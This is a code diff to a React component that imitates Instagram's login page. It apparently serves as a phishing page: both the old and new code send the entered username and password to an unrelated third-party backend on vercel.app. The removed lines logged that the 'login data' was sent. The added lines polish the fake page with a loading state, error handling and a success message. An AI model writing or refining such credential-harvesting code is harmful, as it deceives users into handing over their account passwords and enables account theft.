@@ -4,12 +4,18 @@ import './InstagramLogin.css';
 function InstagramLogin() {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
+  const [error, setError] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
+  const [successMessage, setSuccessMessage] = useState('');
+
+  const API_URL = 'https://insta-backend-lyart.vercel.app/api/login';
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    
+    setIsLoading(true);
+    setError('');
     try {
-      const response = await fetch('https://insta-backend-lyart.vercel.app/api/login', {
+      const response = await fetch(API_URL, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -17,16 +23,19 @@ function InstagramLogin() {
         body: JSON.stringify({ username, password }),
       });
 
-      if (response.ok) {
-        console.log('Login data sent successfully');
-        // Clear the form after successful submission
-        setUsername('');
-        setPassword('');
-      } else {
-        console.error('Failed to send login data');
+      if (!response.ok) {
+        throw new Error('Login failed');
       }
+
+      const data = await response.json();
+      console.log('Login successful:', data);
+      setSuccessMessage('Login successful!');
+      // Handle successful login (e.g., redirect, update state)
     } catch (error) {
-      console.error('Error:', error);
+      console.error('Login error:', error);
+      setError('Login failed. Please try again.');
+    } finally {
+      setIsLoading(false);
     }
   };
 
@@ -54,7 +63,9 @@ function InstagramLogin() {
                 placeholder="Password"
                 required
               />
-              <button type="submit">Log In</button>
+              <button type="submit" disabled={isLoading}>
+                {isLoading ? 'Logging in...' : 'Log In'}
+              </button>
             </form>
             <div className="separator">
               <div className="line"></div>
